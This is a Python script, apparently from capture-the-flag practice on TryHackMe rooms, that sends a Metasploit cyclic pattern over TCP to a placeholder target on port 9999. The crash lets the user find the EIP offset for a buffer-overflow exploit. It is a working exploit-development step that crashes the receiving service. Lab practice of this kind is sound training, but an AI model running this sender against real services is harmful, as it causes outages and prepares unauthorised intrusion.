#!/usr/bin/env python3
"""
bof_pattern.py — Cyclic pattern sender for EIP offset identification.

Generate the pattern first:
  /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l LENGTH > pattern.txt

Attach a debugger to the target process before running. Read the EIP value
from the crash, then calculate offset with:
  /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q EIP_VALUE

Used in: Brainstorm, Brainpan 1, Gatekeeper (TryHackMe)
"""
import socket

HOST = "TARGET_IP"
PORT = 9999
PATTERN_FILE = "pattern.txt"

with open(PATTERN_FILE, "rb") as f:
    payload = f.read().strip()

print(f"[*] Sending {len(payload)}-byte cyclic pattern to {HOST}:{PORT}")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.recv(1024)
s.sendall(payload + b"\r\n")
s.close()
print("[*] Pattern sent. Check debugger for EIP value.")
